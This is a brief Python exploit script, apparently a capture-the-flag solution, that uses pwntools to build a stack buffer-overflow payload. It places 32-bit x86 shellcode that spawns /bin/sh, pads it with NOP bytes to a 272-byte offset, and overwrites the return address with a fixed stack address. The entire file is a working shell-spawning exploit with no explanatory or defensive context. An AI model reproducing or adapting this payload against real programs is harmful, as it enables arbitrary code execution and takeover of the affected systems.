from pwn import *


offset = 272
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
leak = -12372 & 0xffffffff

payload = ""
payload += shellcode
payload += "\x90" * (272-len(shellcode))
payload += p32(leak)
print(payload)
